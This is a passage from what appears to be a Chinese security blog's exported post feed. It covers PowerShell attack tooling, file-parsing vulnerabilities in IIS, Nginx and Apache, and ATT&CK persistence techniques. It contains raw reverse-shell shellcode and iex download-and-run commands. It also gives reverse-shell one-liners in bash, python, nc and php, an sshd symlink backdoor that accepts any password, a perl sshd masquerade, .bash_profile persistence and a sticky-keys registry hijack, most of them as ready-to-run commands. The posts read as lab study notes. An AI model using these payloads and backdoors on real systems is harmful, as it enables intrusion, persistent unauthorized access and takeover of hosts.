<li><img src="/Powershell/10.png" alt><pre><code>0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x11,0x5c,0xc0,0xa8,0x64,0x4,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,0x68,0x0,0x10,0x0,0x0,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x0,0x40,0x0,0x0,0x41,0x58,0x6a,0x0,0x5a,0x41,0xba,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5</code></pre></li>
<li>开启msfconsole监听端口</li>
<li><img src="/Powershell/12.png" alt></li>
<li>执行shellcode</li>
<li><img src="/Powershell/13.png" alt></li>
<li>反弹成功</li>
<li><img src="/Powershell/14.png" alt></li>
</ol>
<p><strong><a href="http://localhost:4000/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">Invoke-DllInjection.ps1</a></strong></p>
<h3 id="0x23-Recon-信息探测"><a href="#0x23-Recon-信息探测" class="headerlink" title="0x23 Recon 信息探测"></a>0x23 Recon 信息探测</h3><ol>
<li><strong>端口扫描</strong></li>
<li>iex(New-Object net.webclient).DownloadString(“<a href="http://192.168.100.1:8888/Recon/Invoke-Portscan.ps1&quot;" target="_blank" rel="noopener">http://192.168.100.1:8888/Recon/Invoke-Portscan.ps1&quot;</a>)</li>
<li><img src="/Powershell/15.png" alt></li>
<li><strong>目录扫描</strong></li>
<li>iex(New-Object Net.WebClient).DownloadString(“<a href="http://192.168.100.1:8888/Recon/Get-HttpStatus.ps1&quot;" target="_blank" rel="noopener">http://192.168.100.1:8888/Recon/Get-HttpStatus.ps1&quot;</a>)</li>
<li><img src="/Powershell/16.png" alt></li>
<li><img src="/Powershell/17.png" alt></li>
</ol>
<h2 id="0xF0-相关链接"><a href="#0xF0-相关链接" class="headerlink" title="0xF0 相关链接"></a>0xF0 相关链接</h2><ol>
<li><a href="https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html" target="_blank" rel="noopener">绕过AMSI执行任意恶意PowerShell代码</a></li>
<li><a href="https://docs.microsoft.com/en-us/powershell/" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/</a></li>
<li><a href="https://www.freebuf.com/column/171993.html" target="_blank" rel="noopener">powersploit</a></li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ul>
<li><a href="https://www.google.com/" target="_blank" rel="noopener">https://www.google.com/</a></li>
</ul>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>文件解析漏洞</title>
    <url>/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><h2 id="0x01-总结"><a href="#0x01-总结" class="headerlink" title="0x01 总结"></a>0x01 总结</h2><ol>
<li>IIS 5.X/6.0</li>
<li>目录解析：创建*.asp*、*.asa*文件夹，文件夹内的任意扩展名的文件都被IIS当作aso文件来解析</li>
<li>例子：/1.asp/2.jpg</li>
<li>文件解析：/1.asp;.jpg</li>
</ol>
<h2 id="0x02-IIS-6-0"><a href="#0x02-IIS-6-0" class="headerlink" title="0x02 IIS 6.0"></a>0x02 IIS 6.0</h2><ol>
<li><strong>环境</strong></li>
<li>windows server 2003 </li>
<li><strong>搭建</strong></li>
<li>下载IIS6.0 i386所需文件</li>
<li>开始——控制面板——添加或删除程序——添加/删除windows组件——勾选应用程序服务器——详细信息——勾选信息服务IIS、启用网站COM+访问、应用程序服务器控制台——信息服务IIS——详细信息——NNTP/SMTP/万维网服务/FTP——确定——确定——下一步——完成（可能出现所需文件窗口，自行百度）</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1.png" alt></li>
<li>虚拟机加载windows server 2003的第二个IOS文件，选择安装可选的windows组件——同上——完成</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/3.png" alt></li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/4.png" alt></li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/2.png" alt></li>
<li>win+R——compmgmt.msc——服务和应用程序——Internet 信息服务（IIS）管理器——网站——默认网站——右击浏览——建设中（说明IIS6安装好了）</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/5.png" alt></li>
<li><strong>部署</strong></li>
<li>win+R——inetmgr（打开Internet 信息服务（IIS）管理器）——右击网站——新建——网站</li>
<li>描述随意</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/8.png" alt></li>
<li>ip默认或者当前ip</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/7.png" alt></li>
<li>指定路径</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/6.png" alt></li>
<li>勾选了运行脚本（ASP）</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/9.png" alt></li>
<li>完成</li>
<li>右击新建的网站——属性——主目录</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/10.png" alt></li>
<li>配置——选项——勾选父路径</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/11.png" alt></li>
<li>调试——勾选两个调试标志——确定</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/12.png" alt></li>
<li>右击新建的网站——权限——是否有everyone（没有则添加——高级——立即查找——everyone）——everyone的权限——完全控制（这是测试环境，真实环境自行判断权限利弊）——确定</li>
<li>右击新建的网站——浏览</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/13.png" alt></li>
<li><strong>目录解析测试</strong></li>
<li>测试文件test.asp：&lt;%= server.mappath(Request.ServerVariables(“PATH_INFO”))%&gt;</li>
<li>.asp改为.jpg，直接访问test.jpg，不能解析asp代码的</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/14.png" alt></li>
<li>新建1.asp文件夹，把test.jpg复制到1.asp文件夹中，访问/1.asp/test.jpg</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/15.png" alt></li>
<li><strong>文件后缀名解析测试</strong></li>
<li>把不在1.asp文件夹的test.jpg改名为1.asp;test.jpg，访问</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/16.png" alt></li>
<li><strong>其他可解析的后缀名</strong></li>
<li>.asa</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/17.png" alt></li>
<li>.cer</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/18.png" alt></li>
<li><strong>原因：</strong></li>
<li>右击网站——属性——主目录——配置</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/19.png" alt></li>
<li>都是使用C:\WINDOWS\system32\inetsrv\asp.dll来执行的</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/20.png" alt></li>
<li>同理，自定义可解析的后缀名</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/21.png" alt></li>
<li>成功解析</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/22.png" alt></li>
<li>试试其他不存在的</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/23.png" alt></li>
</ol>
<h2 id="0x02-IIS-7-0-7-5、Nginx-lt-0-8-37"><a href="#0x02-IIS-7-0-7-5、Nginx-lt-0-8-37" class="headerlink" title="0x02 IIS 7.0/7.5、Nginx &lt;=0.8.37"></a>0x02 IIS 7.0/7.5、Nginx &lt;=0.8.37</h2><ol>
<li>IIS 7.0 需要.net framework 4.0版本</li>
<li>IIS 7.5 需要.net framework 4.5版本</li>
<li><strong>环境</strong></li>
<li>windows server 2008</li>
<li><strong>搭建</strong></li>
<li>开始——管理工具——服务器管理器——角色——添加角色——下一步——勾选web服务器(IIS)</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/27.png" alt></li>
<li>勾选角色服务（重点是勾选CGI）</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/28.png" alt></li>
<li>下一步——安装——完成</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/29.png" alt></li>
<li>服务器管理器——角色——web服务器（IIS）——Internet信息服务（IIS）管理器——WIN-XXXXXXX——网站——Default Web Site——默认启动——浏览</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/30.png" alt></li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/31.png" alt></li>
<li>右击网站——添加网站——填好信息</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/32.png" alt></li>
<li>网站目录下新建test.html文件</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/33.png" alt><pre><code>&lt;!DICTORY html&gt;
&lt;html&gt;
&lt;title&gt;test&lt;/title&gt;
&lt;body&gt;
&lt;h3&gt;IIS 7.5 TEST&lt;/h3&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre></li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/34.png" alt></li>
<li>配置PHP环境（phpstudy的php环境，如php-5.4.45-nts）</li>
<li>修改C:\phpStudy\php\php-5.4.45-nts\php.ini里的（phpstudy的默认配置就好）</li>
<li>extension_dir =”C:\phpStudy\php\php-5.4.45-nts\ext”，单独安装的php，其他相关PHP配置，可自行百度</li>
<li>配置IIS支持PHP——网站——处理程序映射</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/35.png" alt></li>
<li>添加模块映射，设置配置——确定——是</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/36.png" alt></li>
<li>点击起始页下的计算机名——双击FastCgi设置</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/37.png" alt></li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/38.png" alt></li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/39.png" alt></li>
<li>确定</li>
<li>网站目录下新建test.php</li>
<li><?php phpinfo();?></li>
<li>访问测试</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/40.png" alt></li>
<li>把.php改为.jpg，访问，没有解析成php文件</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/41.png" alt></li>
<li>在访问链接后添加/*.php，再次访问</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/42.png" alt></li>
<li>删除CGI角色服务</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/43.png" alt></li>
<li>再次访问</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/44.png" alt></li>
</ol>
<p><strong>同样nginx在fast-cgi开启状态时，同样/1.jpg/.php可解析成php</strong><br><strong>在fast-cgi关闭的情况下，nginx版本:0.5., 0.6., 0.7- 0.7.65, 0.8 -0.8.37，1.jpg%00.php可被解析</strong><br><strong>nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x，上传正常图片，访问时后面+”空格”+”\0”+”.php”，即让图片作为php文件解析，/1.jpg \0.php</strong></p>
<h2 id="0x03-Apache解析漏洞"><a href="#0x03-Apache解析漏洞" class="headerlink" title="0x03 Apache解析漏洞"></a>0x03 Apache解析漏洞</h2><ol>
<li>Apache解析后缀名是从右往左依次解析后缀名，不可识别的后缀名，跳过，识别左一个。</li>
<li>Apache解析后缀名的配置文件：/etc/mime.types（Linux）、X:\PhpStudy2018\PHPTutorial\Apache\conf\mime.types（windows例子）</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/24.png" alt></li>
<li>都被注释了，实际上，解析php的配置文件在/etc/apache2/mods-enabled/php7.3.conf（Linux）、httpd.conf（windows例子）</li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/25.png" alt></li>
<li><strong>对.php这样的文件访问限制</strong><pre><code>&lt;FileMatch &quot;.+\.ph(p[3457]?|t|tml)\.&quot;&gt;
 Require all granted #允许所有访问请求
 Require all denied #拒绝所有访问请求
 Require host google.com #仅允许特定域名的主机访问请求，其他都拒绝
 Require ip 192.168.1.1 #仅允许特定IP的主机访问请求
 Require not ip 192.168.1.2 #拒绝指定IP的访问请求
 Require env env-var [env-var] ... #允许匹配环境变量中任意一个
 Require method http-method [http-method] ... #允许特定的HTTP方法（GET/POST/HEAD/OPTIONS）
 Require expr expression #允许，表达式为true
 Require user userid [ userid ] ... #允许特定用户
 Require group group-name [group-name] ... #允许特定用户组
 Require valid-user # #允许，有效用户
&lt;/FileMatch&gt;</code></pre></li>
<li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/26.png" alt></li>
</ol>
<h2 id="0x04-windows文件名特性"><a href="#0x04-windows文件名特性" class="headerlink" title="0x04 windows文件名特性"></a>0x04 windows文件名特性</h2><ol>
<li>大小写不敏感</li>
<li>test.asp</li>
<li>TEST.ASP</li>
<li>Test.Asp</li>
<li>test.asp.</li>
<li>test.asp[空格]</li>
<li>test.asp[空格].</li>
<li>test.asp.[空格]</li>
<li>test.asp.[空格].</li>
<li>test.asp:test.jpg.. #: 起到截断作用</li>
<li>test.asp .. .. ..</li>
<li>test.asp . . .</li>
<li>这些都是指向test.asp</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li>
</ol>
]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>ATT-CK学习</title>
    <url>/ATT-CK%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/11.png" alt></p>
<ol>
<li>重点讲后门与权限维持。</li>
</ol>
<h2 id="0x01-Linux后门批量kill"><a href="#0x01-Linux后门批量kill" class="headerlink" title="0x01 Linux后门批量kill"></a>0x01 Linux后门批量kill</h2><ol>
<li>ps -ef | grep “keyword” |awk ‘{print $2}’ |xargs kill -9 #-e：所有进程，-f：完整格式，grep：匹配相关关键字，awk：过滤出pid，xargs：将管道数据转换为命令参数，总：kill相关关键字的进程</li>
<li>例子：</li>
<li>ps -ef | grep “python” |awk ‘{print $2}’ |xargs kill -9</li>
<li>ps -ef | grep “bash -i” |awk ‘{print $2}’ |xargs kill -9</li>
</ol>
<h2 id="0x10-Linux"><a href="#0x10-Linux" class="headerlink" title="0x10 Linux"></a>0x10 Linux</h2><h3 id="0x11-T1156-Linux-bash-profile-and-bashrc"><a href="#0x11-T1156-Linux-bash-profile-and-bashrc" class="headerlink" title="0x11 T1156-Linux .bash_profile and .bashrc"></a>0x11 T1156-Linux .bash_profile and .bashrc</h3><ol>
<li>~/.bash_profile 和 ~/.bashrc是包含shell命令的shell脚本。当打开新shell或者用户登录时，这些文件都会被执行。</li>
<li>~/.bash_profile用于登录shell，~/.bashrc用于交互式非登录shell。</li>
<li>通俗说，当用户使用账号密码本地登录或远程登录（SSH）时，~/.bash_profile将在返回初始命令提示符之前被执行。之后，打开新的shell，都会执行~/.bashrc脚本。</li>
<li>危害：攻击者可能通过这些脚本插入可执行文件或命令来获取持久性的后门。</li>
<li><a href="https://blog.csdn.net/duzilonglove/article/details/79729840" target="_blank" rel="noopener">~/.bash_profile 和 ~/.bashrc之间的详细说明与区别</a></li>
</ol>
<p><strong>本地测试~/.bash_profile</strong></p>
<ol>
<li>本机：192.168.100.1</li>
<li>虚拟机：192.168.100.15，Centos 7</li>
<li>虚拟机添加反弹shell命令到~/.bash_profile</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/1.png" alt></li>
<li>本机打开监听端口，重启虚拟机，输入账号密码后，成功反弹shell</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/2.png" alt></li>
<li>弊端：直接这样反弹shell，虚拟机会一直卡住在登录中~，容易被发现，停止交互shell后，虚拟机才会登录成功</li>
<li>执行后门文件，python反弹shell</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/3.png" alt></li>
<li>反弹shell成功且用户成功登录</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/4.png" alt></li>
</ol>
<p><strong>本地测试~/.bashrc</strong></p>
<ol>
<li>同样，把执行命令添加到~/.bashrc，保存，本机打开监听</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/5.png" alt></li>
<li>只要虚拟机打开新shell，都会反弹shell（执行命令）</li>
<li>图略</li>
</ol>
<p><strong>防御</strong></p>
<ol>
<li>检查相关文件预防是否被留后门</li>
<li>扫描本地是否存在后门文件或隐藏的后门文件</li>
<li>检查是否存在敏感进程或隐藏进程</li>
</ol>
<h3 id="0x12-Linux-reverse-shell"><a href="#0x12-Linux-reverse-shell" class="headerlink" title="0x12 Linux-reverse shell"></a>0x12 Linux-reverse shell</h3><p>测试环境：192.168.100.4、192.168.100.8、192.168.100.15<br><strong>bash</strong></p>
<ol>
<li>远程服务器终端执行命令：bash -i &gt;&amp; /dev/tcp/[本地主机IP]/[指定端口] 0&gt;&amp;1 #0：标准输入，1：标准输出，2：标准错误，&gt;、&lt;：重定向，0&gt;1：标准输入重定向到文件1,0&gt;&amp;1：标准输入重定向到标准输出，&gt;&amp;：重定向标准输出和标准错误</li>
<li>本地主机监听命令：nc -lvp [指定端口]</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/33.png" alt></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/34.png" alt></li>
</ol>
<p><strong>python</strong></p>
<ol>
<li>192.168.100.15：python -c “import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘192.168.100.4’,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([‘/bin/bash’,’-i’]);”</li>
<li>192.168.100.4：nc -lvp 8888</li>
</ol>
<p><strong>nc</strong></p>
<ol>
<li>192.168.100.15全功能版本（带-e参数）：nc -e /bin/bash 192.168.100.4 8888</li>
<li>192.168.100.4：nc -lvp 8888</li>
</ol>
<p><strong>nc与管道符</strong></p>
<ol>
<li>192.168.100.4：nc -lvp 7777 #负责发送命令</li>
<li>192.168.100.4：nc -lvp 8888 #负责接收信息</li>
<li>192.168.100.15：nc 192.168.100.4 7777 | /bin/bash | nc 192.168.100.4 8888</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/35.png" alt></li>
</ol>
<p><strong>php</strong></p>
<ol>
<li>php -r ‘exec(“/bin/bash -i &gt;&amp; /dev/tcp/192.168.100.4/8888 0&gt;&amp;1”);’</li>
</ol>
<p><strong>java</strong><br><strong>perl</strong><br><strong>ruby</strong><br>…</p>
<h2 id="0X13-Linux-SSH-backdoor"><a href="#0X13-Linux-SSH-backdoor" class="headerlink" title="0X13 Linux-SSH backdoor"></a>0X13 Linux-SSH backdoor</h2><p><strong>ssh免密登录后门</strong></p>
<ol>
<li>正常的密码登录</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/36.png" alt></li>
<li>ln -sf /usr/sbin/sshd /tmp/su;nohup /tmp/su -oPort=2222 &amp;</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/37.png" alt></li>
<li>再次登录，输入任意密码即登录成功</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/38.png" alt></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/39.png" alt></li>
<li><a href="https://www.freebuf.com/articles/system/138753.html" target="_blank" rel="noopener">参考</a></li>
</ol>
<p><strong>perl脚本伪装sshd</strong></p>
<ol>
<li>先转换端口为big 网络字节序中的16进制字符串\x00\x00XX格式</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/40.png" alt></li>
<li>得 \x00\x0009</li>
<li>perl脚本内容<pre><code>#!/usr/bin/perl
exec&quot;/bin/bash&quot;if(getpeername(STDIN)=~/^..09/);
exec{&quot;/usr/bin/sshd&quot;}&quot;/usr/sbin/sshd&quot;.@ARGV;</code></pre></li>
<li>把/usr/sbin/sshd移到/usr/bin/sshd</li>
<li>将伪装的perl脚本保存到/usr/sbin/sshd</li>
<li>赋权：chmod +x /usr/sbin/sshd</li>
<li>重启服务：/etc/init.d/ssh restart</li>
<li>本地主机：socat STDIO TCP4:192.168.100.8:22,sourceport=12345</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/41.png" alt></li>
<li>查看进程连接</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/42.png" alt></li>
<li>增强隐蔽性，copy /bin/bash 重命名为/bin/sshd，perl代码改为<pre><code>#!/usr/bin/perl
exec&quot;/bin/sshd&quot;if(getpeername(STDIN)=~/^..09/);
exec{&quot;/usr/bin/sshd&quot;}&quot;/usr/sbin/sshd&quot;.@ARGV;</code></pre></li>
</ol>
<p><strong>SSH公钥免密登录</strong><br>…</p>
<h2 id="0x20-windows"><a href="#0x20-windows" class="headerlink" title="0x20 windows"></a>0x20 windows</h2><h3 id="0x21-T1015-Windows-Accessibility-Features（辅助功能）"><a href="#0x21-T1015-Windows-Accessibility-Features（辅助功能）" class="headerlink" title="0x21 T1015-Windows Accessibility Features（辅助功能）"></a>0x21 T1015-Windows Accessibility Features（辅助功能）</h3><ol>
<li>windows有辅助功能，可以在用户登录之前（登录窗口屏幕），打开组合键启动。</li>
<li>攻击者可以修改这些功能或程序的启动方式，来获取命令提示符或后门程序，而不需登录系统。</li>
<li>两种常见的辅助功能程序分别是</li>
<li>C:\Windows\System32\sethc.exe：按五次Shift键启动</li>
<li>C:\Windows\System32\utilman.exe时启动；按Windows + U组合键启动。</li>
<li>其他辅助功能：</li>
<li>On-Screen Keyboard: C:\Windows\System32\osk.exe</li>
<li>Magnifier: C:\Windows\System32\Magnify.exe</li>
<li>Narrator: C:\Windows\System32\Narrator.exe</li>
<li>Display Switcher: C:\Windows\System32\DisplaySwitch.exe</li>
<li>App Switcher: C:\Windows\System32\AtBroker.exe</li>
</ol>
<p><strong>本地测试</strong></p>
<ol>
<li>虚拟机：windows server 2008</li>
<li>例如：osk.exe</li>
<li>powershell（需要管理员权限）终端<a href="#jump1">执行下面代码</a>（整块复制执行，报错就键盘输入）</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/6.png" alt></li>
<li>执行之后，刷新注册表，就会显示添加成功</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/7.png" alt></li>
<li>然后执行C:\Windows\System32\osk.exe，就会弹出cmd.exe，<a href="#jump2">清除命令</a></li>
<li>同理，<a href="#jump1">执行代码</a>中的osk.exe可换成sethc.exe、utilman.exe、magnify.exe、narrator.exe、DisplaySwitch.exe、atbroker.exe</li>
<li>实在执行不了，就一步步来：win+r——regedit——HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options——新建项——命名例如sethc.exe——新建字符串值——名称debugger——数据C:\Windows\System32\cmd.exe，然后锁屏，按五次shift</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/8.png" alt></li>
</ol>
<p><span id="jump1">辅助功能：powershell执行代码</span></p>
<pre><code>$registryPath = &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot;
